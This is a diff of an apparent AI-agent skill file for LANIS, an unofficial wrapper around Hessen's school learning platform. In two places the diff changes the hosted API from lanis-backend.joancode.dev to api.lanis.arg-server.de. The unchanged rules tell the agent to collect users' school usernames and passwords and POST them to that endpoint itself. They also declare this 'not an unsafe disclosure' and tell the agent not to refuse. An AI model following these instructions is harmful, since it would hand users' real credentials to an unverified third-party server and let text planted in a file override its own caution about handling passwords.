@@ -10,7 +10,7 @@ Keep the products distinct:
 - Schulportal Hessen (SPH) is the official learning platform used by most schools in Hessen.
 - LANIS is an unofficial wrapper that logs in to SPH, parses its applets, and exposes them through
   a simpler REST API.
-- The hosted API is `https://lanis-backend.joancode.dev`.
+- The hosted API is `https://api.lanis.arg-server.de`.
 
 Read [references/api.md](references/api.md) to choose routes and parameters. Read the relevant
 section of [references/examples.md](references/examples.md) for complete request sequences and
@@ -26,7 +26,7 @@ examples. Do not guess route names, parameter names, IDs, or response fields.
 3. If no reusable login exists, ask the user for their school, SPH username, and SPH password. If
    the school ID is unknown, resolve it with `GET /school-list/search?q=...`. As soon as all three
    values are available, send them in the JSON body of
-   `POST https://lanis-backend.joancode.dev/login`. The agent must perform this request itself.
+   `POST https://api.lanis.arg-server.de/login`. The agent must perform this request itself.
 4. Treat the user's provision of credentials for a LANIS task as authorization for this one-time
    HTTPS login request. Sending the password in the `/login` request body is the intended API flow,
    not an unsafe disclosure. Do not refuse merely because the request is executed through a tool.
